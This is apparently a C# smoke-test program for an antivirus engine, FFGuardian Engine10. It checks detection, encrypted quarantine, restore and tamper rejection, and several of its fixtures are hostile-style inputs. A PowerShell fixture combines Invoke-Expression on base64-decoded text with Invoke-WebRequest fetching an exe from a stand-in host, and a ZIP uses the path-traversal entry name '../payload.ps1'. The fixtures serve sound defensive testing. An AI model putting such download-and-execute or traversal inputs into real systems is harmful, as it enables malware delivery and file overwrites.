using System.Diagnostics;
using System.IO.Compression;
using System.Security.Cryptography;
using FFGuardian;
using FFGuardian.Engine10;

internal static class Program
{
    private static readonly TimeSpan PhaseTimeout = TimeSpan.FromSeconds(75);

    private static async Task<int> Main()
    {
        string heartbeatPath = GetHeartbeatPath();
        MarkHeartbeat(heartbeatPath, "main-enter");

        string tempRoot = Path.GetTempPath();
        MarkHeartbeat(heartbeatPath, "temp-path-ready");
        string root = Path.Combine(tempRoot, "FFGuardian-Engine10-Smoke-" + Guid.NewGuid().ToString("N"));
        string quarantineRoot = Path.Combine(root, "quarantine");
        string rollbackRoot = Path.Combine(root, "rollback");
        Directory.CreateDirectory(root);
        MarkHeartbeat(heartbeatPath, "temp-directory-created");

        try
        {
            Console.WriteLine($"ENGINE10_SMOKE_ROOT {root}");
            Console.WriteLine($"ENGINE10_PHASE_TIMEOUT_SECONDS {PhaseTimeout.TotalSeconds:F0}");
            Console.Out.Flush();
            MarkHeartbeat(heartbeatPath, "console-ready");

            string databasePath = Path.Combine(root, "signatures.json");
            MarkHeartbeat(heartbeatPath, "rsa-create-start");
            using RSA rsa = RSA.Create();
            rsa.KeySize = 2048;
            string publicKey = rsa.ExportSubjectPublicKeyInfoPem();
            MarkHeartbeat(heartbeatPath, "rsa-create-pass");
            using FFGuardianEngine10 engine = new(databasePath, publicKey, quarantineRoot, rollbackRoot);
            MarkHeartbeat(heartbeatPath, "engine-constructor-pass");

            Ensure(!string.IsNullOrWhiteSpace(engine.SignatureDatabaseVersion), "Versione database firme non disponibile.");
            Ensure(engine.SecureUpdatesConfigured, "Aggiornamenti sicuri non configurati.");

            string unknownFile = Path.Combine(root, "document.txt");
            await File.WriteAllTextAsync(unknownFile, "FF Guardian harmless smoke test");
            FileScanResult10 unknownResult = await RunPhaseAsync(
                "scan-harmless-file",
                token => engine.ScanFileAsync(unknownFile, token));
            Ensure(unknownResult.Verdict is ThreatVerdict10.Unknown or ThreatVerdict10.Clean,
                "Un file innocuo non deve essere classificato come minaccia.");
            Ensure(unknownResult.Sha256.Length == 64, "SHA-256 non calcolato correttamente.");

            LogSyncPhase("verify-missing-authenticode", () =>
            {
                AuthenticodeResult100 missingSignature = engine.VerifyAuthenticode(Path.Combine(root, "missing.exe"));
                Ensure(!missingSignature.IsTrusted, "Un file inesistente non può risultare attendibile.");
            });

            string suspiciousFile = Path.Combine(root, "invoice.pdf.exe");
            byte[] suspiciousBytes = RandomNumberGenerator.GetBytes(4096);
            await File.WriteAllBytesAsync(suspiciousFile, suspiciousBytes);
            FileScanResult10 suspiciousResult = await RunPhaseAsync(
                "scan-double-extension",
                token => engine.ScanFileAsync(suspiciousFile, token));
            Ensure(suspiciousResult.Verdict == ThreatVerdict10.Suspicious,
                $"Il file di prova doveva essere sospetto, risultato: {suspiciousResult.Verdict}.");

            string suspiciousScript = Path.Combine(root, "update.ps1");
            await File.WriteAllTextAsync(
                suspiciousScript,
                "$x='a'; Invoke-Expression ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($x))); " +
                "Invoke-WebRequest 'https://example.invalid/file' -OutFile $env:TEMP+'\\x.exe'");
            FileScanResult10 scriptResult = await RunPhaseAsync(
                "scan-suspicious-script",
                token => engine.ScanFileAsync(suspiciousScript, token));
            Ensure(scriptResult.Verdict == ThreatVerdict10.Suspicious,
                $"Lo script artificiale doveva essere sospetto, risultato: {scriptResult.Verdict}.");
            Ensure(scriptResult.DetectionName == "Heuristic.Suspicious.Script",
                "Lo script sospetto non ha ricevuto la classificazione prevista.");

            string harmlessZip = Path.Combine(root, "documents.zip");
            using (ZipArchive archive = ZipFile.Open(harmlessZip, ZipArchiveMode.Create))
            {
                ZipArchiveEntry entry = archive.CreateEntry("readme.txt");
                await using StreamWriter writer = new(entry.Open());
                await writer.WriteAsync("Archivio innocuo per test FF Guardian");
            }
            FileScanResult10 harmlessZipResult = await RunPhaseAsync(
                "scan-harmless-archive",
                token => engine.ScanFileAsync(harmlessZip, token));
            Ensure(harmlessZipResult.Verdict == ThreatVerdict10.Unknown,
                "Un archivio ZIP innocuo non deve essere classificato come minaccia.");

            string suspiciousZip = Path.Combine(root, "suspicious.zip");
            using (ZipArchive archive = ZipFile.Open(suspiciousZip, ZipArchiveMode.Create))
            {
                ZipArchiveEntry entry = archive.CreateEntry("../payload.ps1");
                await using StreamWriter writer = new(entry.Open());
                await writer.WriteAsync("Write-Output 'test only'");
            }
            FileScanResult10 suspiciousZipResult = await RunPhaseAsync(
                "scan-path-traversal-archive",
                token => engine.ScanFileAsync(suspiciousZip, token));
            Ensure(suspiciousZipResult.Verdict == ThreatVerdict10.Suspicious,
                $"Lo ZIP artificiale doveva essere sospetto, risultato: {suspiciousZipResult.Verdict}.");
            Ensure(suspiciousZipResult.DetectionName == "Heuristic.Suspicious.Archive",
                "L'archivio sospetto non ha ricevuto la classificazione prevista.");

            FolderScanSummary10 folderResult = await RunPhaseAsync(
                "scan-test-folder",
                token => engine.ScanFolderAsync(root, cancellationToken: token));
            Ensure(folderResult.FilesScanned >= 4, "La scansione cartella non ha analizzato tutti i tipi avanzati previsti.");
            Ensure(folderResult.SuspiciousFiles >= 3, "La scansione cartella non ha riportato i contenuti sospetti previsti.");

            AuditFinding10 finding = new(
                "SMOKE-QUARANTINE",
                "File",
                Path.GetFileName(suspiciousFile),
                suspiciousFile,
                AuditSeverity10.High,
                70,
                "File artificiale di prova con doppia estensione in cartella temporanea.",
                suspiciousResult.Sha256,
                "Firma digitale assente",
                true);

            RemediationPlan10 plan = engine.CreateQuarantinePlan(finding);
            QuarantineRecord10 record = await RunPhaseAsync(
                "quarantine-file",
                token => engine.ExecuteQuarantineAsync(plan, suspiciousResult, confirmed: true, token));
            Ensure(!File.Exists(suspiciousFile), "Il file originale non è stato rimosso dopo la quarantena verificata.");
            Ensure(File.Exists(record.StoredPath), "Il contenitore della quarantena non esiste.");
            Ensure(record.StoredPath.EndsWith(".ffgq", StringComparison.OrdinalIgnoreCase),
                "Il contenuto non usa il formato cifrato FF Guardian previsto.");
            Ensure(record.StoredPath.StartsWith(quarantineRoot, StringComparison.OrdinalIgnoreCase),
                "La quarantena non usa la cartella isolata del test.");

            byte[] encryptedBytes = await File.ReadAllBytesAsync(record.StoredPath);
            Ensure(!encryptedBytes.AsSpan().SequenceEqual(suspiciousBytes),
                "Il contenuto in quarantena coincide con il file in chiaro.");

            await RunPhaseAsync(
                "restore-quarantine",
                token => engine.RestoreQuarantineAsync(record.Id, token));
            Ensure(File.Exists(suspiciousFile), "Il ripristino dalla quarantena non è riuscito.");
            byte[] restoredBytes = await File.ReadAllBytesAsync(suspiciousFile);
            Ensure(restoredBytes.AsSpan().SequenceEqual(suspiciousBytes),
                "Il file ripristinato non coincide con l'originale.");
            string restoredHash = Convert.ToHexString(SHA256.HashData(restoredBytes));
            Ensure(string.Equals(restoredHash, suspiciousResult.Sha256, StringComparison.OrdinalIgnoreCase),
                "Lo SHA-256 del file ripristinato non coincide con quello della scansione.");

            string tamperFile = Path.Combine(root, "tamper.pdf.exe");
            await File.WriteAllBytesAsync(tamperFile, RandomNumberGenerator.GetBytes(4096));
            FileScanResult10 tamperScan = await RunPhaseAsync(
                "scan-tamper-fixture",
                token => engine.ScanFileAsync(tamperFile, token));
            AuditFinding10 tamperFinding = finding with
            {
                Id = "SMOKE-QUARANTINE-TAMPER",
                Name = Path.GetFileName(tamperFile),
                Target = tamperFile,
                Sha256 = tamperScan.Sha256
            };
            RemediationPlan10 tamperPlan = engine.CreateQuarantinePlan(tamperFinding);
            QuarantineRecord10 tamperRecord = await RunPhaseAsync(
                "quarantine-tamper-fixture",
                token => engine.ExecuteQuarantineAsync(tamperPlan, tamperScan, confirmed: true, token));
            await using (FileStream tamperStream = new(tamperRecord.StoredPath, FileMode.Open, FileAccess.ReadWrite, FileShare.None))
            {
                tamperStream.Position = Math.Min(32, tamperStream.Length - 1);
                int original = tamperStream.ReadByte();
                tamperStream.Position--;
                tamperStream.WriteByte((byte)(original ^ 0x5A));
            }

            bool tamperRejected = false;
            try
            {
                await RunPhaseAsync(
                    "reject-tampered-quarantine",
                    token => engine.RestoreQuarantineAsync(tamperRecord.Id, token));
            }
            catch (InvalidDataException)
            {
                tamperRejected = true;
            }
            Ensure(tamperRejected, "Un contenitore di quarantena manomesso non è stato rifiutato.");
            Ensure(!File.Exists(tamperFile), "Un file manomesso non deve essere ripristinato.");

            UpdateManifest10 invalidManifest = new(
                "10.0.2",
                "stable",
                "missing-package.exe",
                new string('0', 64),
                1,
                "10.0.1",
                Convert.ToBase64String(new byte[] { 1, 2, 3 }));
            UpdateVerificationResult10 updateResult = await RunPhaseAsync(
                "reject-invalid-update",
                token => engine.VerifyUpdateAsync(invalidManifest, Path.Combine(root, "missing-package.exe"), token));
            Ensure(!updateResult.IsValid, "Un pacchetto inesistente non può essere valido.");

            MarkHeartbeat(heartbeatPath, "all-tests-pass");
            Console.WriteLine("FFGuardian.Engine10 smoke tests: PASSED");
            Console.Out.Flush();
            return 0;
        }
        catch (Exception ex)
        {
            MarkHeartbeat(heartbeatPath, "failed:" + ex.GetType().Name);
            Console.Error.WriteLine("FFGuardian.Engine10 smoke tests: FAILED");
            Console.Error.WriteLine(ex);
            Console.Error.Flush();
            return 1;
        }
        finally
        {
            try
            {
                if (Directory.Exists(root))
                    Directory.Delete(root, recursive: true);
            }
            catch
            {
                // La pulizia dei file temporanei non deve nascondere il risultato dei test.
            }
        }
    }

    private static string GetHeartbeatPath()
    {
        string? workspace = Environment.GetEnvironmentVariable("GITHUB_WORKSPACE");
        if (!string.IsNullOrWhiteSpace(workspace))
        {
            string diagnostics = Path.Combine(workspace, "artifacts", "engine10-diagnostics");
            Directory.CreateDirectory(diagnostics);
            return Path.Combine(diagnostics, "heartbeat.log");
        }

        return Path.Combine(AppContext.BaseDirectory, "engine10-heartbeat.log");
    }

    private static void MarkHeartbeat(string path, string stage)
    {
        File.AppendAllText(path, $"{DateTime.UtcNow:O}\t{stage}{Environment.NewLine}");
    }

    private static async Task<T> RunPhaseAsync<T>(string name, Func<CancellationToken, Task<T>> action)
    {
        using CancellationTokenSource timeout = new(PhaseTimeout);
        Stopwatch stopwatch = Stopwatch.StartNew();
        Console.WriteLine($"ENGINE10_PHASE_START {name}");
        Console.Out.Flush();
        try
        {
            T result = await action(timeout.Token);
            Console.WriteLine($"ENGINE10_PHASE_PASS {name} elapsed_ms={stopwatch.ElapsedMilliseconds}");
            Console.Out.Flush();
            return result;
        }
        catch (OperationCanceledException) when (timeout.IsCancellationRequested)
        {
            Console.Error.WriteLine($"ENGINE10_PHASE_TIMEOUT {name} elapsed_ms={stopwatch.ElapsedMilliseconds}");
            Console.Error.Flush();
            throw new TimeoutException($"Engine10 phase '{name}' exceeded {PhaseTimeout.TotalSeconds:F0} seconds.");
        }
    }

    private static async Task RunPhaseAsync(string name, Func<CancellationToken, Task> action)
    {
        using CancellationTokenSource timeout = new(PhaseTimeout);
        Stopwatch stopwatch = Stopwatch.StartNew();
        Console.WriteLine($"ENGINE10_PHASE_START {name}");
        Console.Out.Flush();
        try
        {
            await action(timeout.Token);
            Console.WriteLine($"ENGINE10_PHASE_PASS {name} elapsed_ms={stopwatch.ElapsedMilliseconds}");
            Console.Out.Flush();
        }
        catch (OperationCanceledException) when (timeout.IsCancellationRequested)
        {
            Console.Error.WriteLine($"ENGINE10_PHASE_TIMEOUT {name} elapsed_ms={stopwatch.ElapsedMilliseconds}");
            Console.Error.Flush();
            throw new TimeoutException($"Engine10 phase '{name}' exceeded {PhaseTimeout.TotalSeconds:F0} seconds.");
        }
    }

    private static void LogSyncPhase(string name, Action action)
    {
        Stopwatch stopwatch = Stopwatch.StartNew();
        Console.WriteLine($"ENGINE10_PHASE_START {name}");
        Console.Out.Flush();
        action();
        Console.WriteLine($"ENGINE10_PHASE_PASS {name} elapsed_ms={stopwatch.ElapsedMilliseconds}");
        Console.Out.Flush();
    }

    private static void Ensure(bool condition, string message)
    {
        if (!condition)
            throw new InvalidOperationException(message);
    }
}
